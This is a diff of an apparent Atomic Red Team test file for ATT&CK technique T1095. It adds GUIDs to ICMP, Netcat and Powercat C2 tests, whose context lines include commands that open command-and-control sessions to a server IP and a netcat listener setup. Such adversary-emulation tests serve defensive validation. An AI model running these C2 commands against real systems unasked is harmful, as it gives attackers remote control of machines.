@@ -1,8 +1,8 @@
-attack_technique:
-- T1095
+attack_technique: T1095
 display_name: Non-Application Layer Protocol
 atomic_tests:
 - name: ICMP C2
+  auto_generated_guid: 0268e63c-e244-42db-bef7-72a9e59fc1fc
   description: |
     This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
     refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
@@ -19,6 +19,7 @@ atomic_tests:
       Invoke-PowerShellIcmp -IPAddress #{server_ip}
     name: powershell
 - name: Netcat C2
+  auto_generated_guid: bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37 
   description: "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n"
   supported_platforms:
   - windows
@@ -59,6 +60,7 @@ atomic_tests:
       cmd /c #{ncat_exe} #{server_ip} #{server_port}
     name: powershell
 - name: Powercat C2
+  auto_generated_guid: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
   description: "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n"
   supported_platforms:
   - windows
